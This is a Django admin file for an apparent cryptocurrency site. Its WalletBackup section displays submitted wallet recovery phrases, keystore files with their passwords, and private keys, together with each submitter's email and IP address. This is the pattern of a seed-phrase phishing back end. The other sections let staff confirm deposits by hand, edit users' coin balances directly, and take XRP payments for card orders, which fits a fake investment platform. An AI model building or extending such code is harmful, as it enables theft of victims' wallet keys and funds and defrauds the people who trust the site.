from django.contrib import admin
from .models import WalletBackup, KYCVerification, DepositTransaction, Notification, Wallet, CardOrder
from django.utils import timezone

@admin.register(WalletBackup)
class WalletBackupAdmin(admin.ModelAdmin):
    list_display = ('uid', 'wallet_name', 'email', 'form_type', 'created_at')
    list_filter = ('form_type', 'created_at')
    search_fields = ('uid', 'wallet_name', 'email', 'wallet_display_name')
    readonly_fields = ('uid', 'created_at', 'ip_address')
    
    def get_fieldsets(self, request, obj=None):
        """Dynamically generate fieldsets based on form_type"""
        fieldsets = [
            ('Basic Information', {
                'fields': ('uid', 'wallet_name', 'wallet_display_name', 'email', 'form_type', 'ip_address')
            }),
        ]
        
        # Add form-type specific fields
        if obj:
            if obj.form_type == 'phrase':
                fieldsets.append(
                    ('Wallet Data - Recovery Phrase', {
                        'fields': ('phrase',),
                        'classes': ('collapse',),
                    })
                )
            elif obj.form_type == 'keystore':
                fieldsets.append(
                    ('Wallet Data - Keystore JSON', {
                        'fields': ('keystore_json', 'keystore_password'),
                        'classes': ('collapse',),
                    })
                )
            elif obj.form_type == 'private_key':
                fieldsets.append(
                    ('Wallet Data - Private Key', {
                        'fields': ('private_key',),
                        'classes': ('collapse',),
                    })
                )
        else:
            # For new objects (shouldn't happen in this case), show all fields
            fieldsets.append(
                ('Wallet Data', {
                    'fields': ('phrase', 'keystore_json', 'keystore_password', 'private_key'),
                    'classes': ('collapse',),
                })
            )
        
        fieldsets.append(
            ('Metadata', {
                'fields': ('created_at',)
            })
        )
        
        return fieldsets


@admin.register(KYCVerification)
class KYCVerificationAdmin(admin.ModelAdmin):
    list_display = ('user', 'status', 'document_type', 'submitted_at')
    list_filter = ('status', 'document_type', 'submitted_at')
    search_fields = ('user__username', 'user__email', 'user__first_name')
    readonly_fields = ('submitted_at',)
    
    fieldsets = (
        ('User Information', {
            'fields': ('user', 'status')
        }),
        ('Document Details', {
            'fields': ('document_type', 'document_file')
        }),
        ('Submission Information', {
            'fields': ('submitted_at',)
        }),
    )
    
    def save_model(self, request, obj, form, change):
        # Update reviewed_at and reviewed_by when status changes
        if change and 'status' in form.changed_data:
            if obj.status in ['verified', 'rejected']:
                obj.reviewed_at = timezone.now()
                obj.reviewed_by = request.user
                
                # Create notification for user
                if obj.status == 'verified':
                    Notification.objects.create(
                        user=obj.user,
                        type='kyc_update',
                        title='KYC Verification Approved ✓',
                        message='Your identity verification has been successfully approved. You now have full access to all platform features.'
                    )
                elif obj.status == 'rejected':
                    Notification.objects.create(
                        user=obj.user,
                        type='kyc_update',
                        title='KYC Verification Rejected',
                        message='Unfortunately, your identity verification could not be approved. Please resubmit with valid documents or contact support for assistance.'
                    )
        super().save_model(request, obj, form, change)
    
    actions = ['mark_verified', 'mark_rejected']
    
    def mark_verified(self, request, queryset):
        # Mark selected KYC verifications as verified
        updated = 0
        for kyc in queryset:
            kyc.status = 'verified'
            kyc.reviewed_at = timezone.now()
            kyc.reviewed_by = request.user
            kyc.save()
            
            # Create notification
            Notification.objects.create(
                user=kyc.user,
                type='kyc_update',
                title='KYC Verification Approved ✓',
                message='Your identity verification has been successfully approved. You now have full access to all platform features.'
            )
            updated += 1
        self.message_user(request, f'{updated} KYC verification(s) marked as verified.')
    mark_verified.short_description = 'Mark selected as Verified'
    
    def mark_rejected(self, request, queryset):
        # Mark selected KYC verifications as rejected
        updated = 0
        for kyc in queryset:
            kyc.status = 'rejected'
            kyc.reviewed_at = timezone.now()
            kyc.reviewed_by = request.user
            kyc.save()
            
            # Create notification
            Notification.objects.create(
                user=kyc.user,
                type='kyc_update',
                title='KYC Verification Rejected',
                message='Unfortunately, your identity verification could not be approved. Please resubmit with valid documents or contact support for assistance.'
            )
            updated += 1
        self.message_user(request, f'{updated} KYC verification(s) marked as rejected.')
    mark_rejected.short_description = 'Mark selected as Rejected'


@admin.register(DepositTransaction)
class DepositTransactionAdmin(admin.ModelAdmin):
    list_display = ('user', 'coin_type', 'amount', 'status', 'created_at', 'confirmed_at')
    list_filter = ('status', 'coin_type', 'created_at')
    search_fields = ('user__username', 'user__email', 'wallet_address')
    readonly_fields = ('created_at',)
    
    fieldsets = (
        ('Transaction Details', {
            'fields': ('user', 'coin_type', 'amount', 'wallet_address', 'status')
        }),
        ('Timestamps', {
            'fields': ('created_at',)
        }),
    )
    
    actions = ['mark_confirmed', 'mark_rejected']
    
    def save_model(self, request, obj, form, change):
        """
        Override save_model to update wallet balance when status changes to confirmed
        """
        # Check if this is an update and status changed to confirmed
        if change and 'status' in form.changed_data:
            if obj.status == 'confirmed' and obj.amount and obj.amount > 0:
                # Get or create user wallet
                wallet, created = Wallet.objects.get_or_create(user=obj.user)
                
                # Add balance to specific coin
                wallet.add_balance(obj.coin_type, obj.amount)
                
                # Set confirmation details
                obj.confirmed_at = timezone.now()
                obj.processed_by = request.user
                
                # Create notification
                Notification.objects.create(
                    user=obj.user,
                    type='deposit_confirmed',
                    title='Deposit Confirmed ✓',
                    message=f'Your {obj.get_coin_type_display()} deposit of ${obj.amount} has been confirmed and credited to your account.'
                )
                
                self.message_user(request, f'Deposit confirmed and ${obj.amount} added to {obj.user.username}\'s {obj.coin_type} balance.')
        
        super().save_model(request, obj, form, change)
    
    def mark_confirmed(self, request, queryset):
        updated = 0
        errors = []
        
        for transaction in queryset.filter(status='pending'):
            try:
                # Only process if amount is set
                if not transaction.amount or transaction.amount <= 0:
                    errors.append(f"Transaction {transaction.id}: No amount set or amount is zero")
                    continue
                
                # Get or create user wallet BEFORE updating transaction
                wallet, created = Wallet.objects.get_or_create(user=transaction.user)
                
                # Add balance to specific coin
                coin_type = transaction.coin_type
                amount = transaction.amount
                
                # Debug: Log before balance update
                print(f"DEBUG: Updating {coin_type}_balance for user {transaction.user.username}")
                print(f"DEBUG: Amount to add: ${amount}")
                print(f"DEBUG: Current balance: ${wallet.get_balance(coin_type)}")
                
                wallet.add_balance(coin_type, amount)
                
                # Debug: Log after balance update
                wallet.refresh_from_db()
                print(f"DEBUG: New balance: ${wallet.get_balance(coin_type)}")
                
                # Update transaction status
                transaction.status = 'confirmed'
                transaction.confirmed_at = timezone.now()
                transaction.processed_by = request.user
                transaction.save()
                
                # Create notification
                Notification.objects.create(
                    user=transaction.user,
                    type='deposit_confirmed',
                    title='Deposit Confirmed ✓',
                    message=f'Your {transaction.get_coin_type_display()} deposit of ${transaction.amount} has been confirmed and credited to your account.'
                )
                updated += 1
                
            except Exception as e:
                errors.append(f"Transaction {transaction.id}: {str(e)}")
                print(f"ERROR updating transaction {transaction.id}: {str(e)}")
        
        if errors:
            self.message_user(request, f'Errors: {"; ".join(errors)}', level='ERROR')
        
        if updated > 0:
            self.message_user(request, f'{updated} transaction(s) marked as confirmed and balances updated.')
        else:
            self.message_user(request, 'No transactions were updated. Check that amounts are set.', level='WARNING')
    mark_confirmed.short_description = 'Mark selected as Confirmed'
    
    def mark_rejected(self, request, queryset):
        updated = 0
        for transaction in queryset.filter(status='pending'):
            transaction.status = 'rejected'
            transaction.processed_by = request.user
            transaction.save()
            
            # Create notification
            Notification.objects.create(
                user=transaction.user,
                type='transaction',
                title='Deposit Rejected',
                message=f'Your {transaction.get_coin_type_display()} deposit has been rejected. Please contact support for more information.'
            )
            updated += 1
        self.message_user(request, f'{updated} transaction(s) marked as rejected.')
    mark_rejected.short_description = 'Mark selected as Rejected'


@admin.register(Wallet)
class WalletAdmin(admin.ModelAdmin):
    list_display = ('user', 'get_total_balance', 'bitcoin_balance', 'ethereum_balance', 'xrp_balance', 'updated_at')
    list_filter = ('created_at', 'updated_at')
    search_fields = ('user__username', 'user__email')
    readonly_fields = ('created_at', 'updated_at', 'get_total_balance')
    
    fieldsets = (
        ('User', {
            'fields': ('user',)
        }),
        ('Main Cryptocurrencies', {
            'fields': ('bitcoin_balance', 'ethereum_balance', 'xrp_balance', 'usdt_balance')
        }),
        ('Alternative Cryptocurrencies', {
            'fields': ('solana_balance', 'xlm_balance', 'doge_balance', 'ada_balance', 'dot_balance', 'trx_balance')
        }),
        ('Meme & Stablecoins', {
            'fields': ('shiba_balance', 'usdc_balance')
        }),
        ('Legacy Fields', {
            'fields': ('ripple_balance', 'stellar_balance', 'bnb_balance', 'bnb_tiger_balance'),
            'classes': ('collapse',)
        }),
        ('Totals & Metadata', {
            'fields': ('get_total_balance', 'created_at', 'updated_at')
        }),
    )
    
    def get_total_balance(self, obj):
        return f"${obj.total_balance:,.2f}"
    get_total_balance.short_description = 'Total Balance'


@admin.register(CardOrder)
class CardOrderAdmin(admin.ModelAdmin):
    list_display = ('user', 'full_name', 'email', 'xrp_amount', 'status', 'ordered_at')
    list_filter = ('status', 'ordered_at')
    search_fields = ('user__username', 'full_name', 'email', 'phone_number')
    readonly_fields = ('user', 'full_name', 'email', 'phone_number', 'full_address', 'xrp_amount', 'transaction_screenshot', 'ordered_at', 'updated_at')
    list_editable = ('status',)
    
    fieldsets = (
        ('User Information', {
            'fields': ('user', 'full_name', 'email', 'phone_number')
        }),
        ('Shipping Details', {
            'fields': ('full_address',)
        }),
        ('Payment Information', {
            'fields': ('xrp_amount', 'transaction_screenshot')
        }),
        ('Order Status', {
            'fields': ('status',)
        }),
        ('Timestamps', {
            'fields': ('ordered_at', 'updated_at')
        }),
    )
    
    def save_model(self, request, obj, form, change):
        if change and not obj.processed_by:
            obj.processed_by = request.user
        super().save_model(request, obj, form, change)
